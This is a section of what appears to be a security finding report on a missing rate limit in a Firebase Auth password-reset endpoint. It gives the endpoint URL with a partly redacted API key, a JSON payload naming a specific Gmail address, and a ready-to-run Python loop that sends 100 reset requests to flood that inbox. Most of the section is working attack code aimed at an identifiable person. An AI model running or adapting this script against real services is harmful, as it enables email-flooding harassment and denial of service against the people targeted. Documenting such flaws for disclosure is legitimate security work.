## 6. PASSWORD RESET FLOOD

### Vulnerability
Firebase Auth `sendOobCode` endpoint has no rate limit. Can flood any
registered email with unlimited password reset emails.

### Endpoint
```
POST https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=AIzaSyBPi[REDACTED]
```

### Payload
```json
{"requestType": "PASSWORD_RESET", "email": "yanzz@gmail.com"}
```

# EXECUTION TRACE
```python
import requests, time

KEY = "AIzaSyBPi[REDACTED]"
for i in range(100):
    r = requests.post(
        f"https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key={KEY}",
        json={"requestType": "PASSWORD_RESET", "email": "yanzz@gmail.com"}
    )
    print(f"Reset {i+1}: {r.status_code}")
    time.sleep(0.5)
```

# BLAST RADIUS
Denial of service on owner's email inbox. 100+ reset emails per minute.

